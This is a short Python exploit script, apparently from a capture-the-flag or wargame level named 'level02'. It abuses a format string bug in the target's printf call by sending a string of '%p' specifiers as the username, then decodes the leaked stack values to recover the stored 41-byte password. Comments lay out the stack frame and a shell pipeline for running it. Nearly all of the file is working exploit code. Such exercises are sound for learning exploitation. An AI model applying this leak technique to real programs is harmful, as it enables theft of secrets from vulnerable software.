#!/usr/bin/env python3
import sys
import struct
import subprocess

# Format string vulnerability in printf(s) at line 171
#
# Stack layout (64-bit):
# [rbp-110h]  s2[96]      - Password input
# [rbp-B0h]   v5
# [rbp-A0h]   ptr[48]     - Real password (41 bytes) ‚Üê TARGET!
# [rbp-70h]   s[96]       - Username input (we control this)
#
# Strategy: Use format string to leak stack memory and find the password

def leak_password():
    """Leak the password using format string vulnerability"""
    # Username: Format string to dump stack
    # %p prints pointer values from the stack
    username = "%p " * 30 + "\n"

    # Password: Any wrong password to trigger the vulnerability
    password = "wrong\n"

    # Output for piping to the program
    sys.stdout.write(username)
    sys.stdout.write(password)

def decode_password_from_leak(leak_output):
    """
    Decode password from leaked stack values.
    The password appears at positions 21-25 in the %p output.
    """
    # Extract hex values from output
    # Example: 0x756e505234376848 0x45414a3561733951 ...
    parts = leak_output.split()

    # Find the password values (they start around position 21)
    password_values = []
    for part in parts:
        if part.startswith('0x') and len(part) == 18:  # 64-bit hex value
            try:
                val = int(part, 16)
                # Check if it looks like ASCII (printable characters)
                bytes_val = struct.pack('<Q', val)
                if all(32 <= b < 127 for b in bytes_val if b != 0):
                    password_values.append(val)
            except:
                pass

    # Decode the password
    password = b''
    for val in password_values[:5]:  # Password is 41 bytes = 5 * 8 + 1
        password += struct.pack('<Q', val)

    return password.decode('ascii').rstrip('\x00')

if __name__ == "__main__":
    # Just output the format string payload
    leak_password()

    # To decode the password from the leak, run:
    # python3 exploit.py | ./level02 2>&1 | grep -oP '0x[0-9a-f]+' | python3 -c "..."

